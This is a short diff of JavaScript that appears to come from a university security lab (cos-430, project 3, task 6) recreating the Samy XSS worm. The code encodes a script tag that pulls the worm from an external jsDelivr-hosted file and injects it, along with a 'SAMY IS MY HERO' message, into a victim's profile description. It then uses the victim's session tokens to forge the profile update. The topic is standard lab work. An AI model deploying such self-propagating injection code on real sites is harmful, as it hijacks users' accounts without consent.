@@ -6,10 +6,10 @@ window.onload = function(){
 	// 	"src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/main/project03_task6_link3.js\">" +
 	// 	"</" + "script>");
 
-	var wormCode = encodeURIComponent("<script type=\"text/javascript\" id=\"worm\" src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/project03_task6_link3.js\"></script>");
+	var wormCode = encodeURIComponent("<script type=\"text/javascript\" id=\"worm\" src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430@latest/project03_task6_link3.js\"></script>");
 	
 	// Set the content for the description field
-	var desc ="&description=I love Samy" + wormCode + "&accesslevel[description]=2";
+	var desc ="&description=SAMY IS MY HERO" + wormCode + "&accesslevel[description]=2";
 
 	//rest of the code is the same as that in the previous approach...
 	// Get the name, guid, timestamp, and token
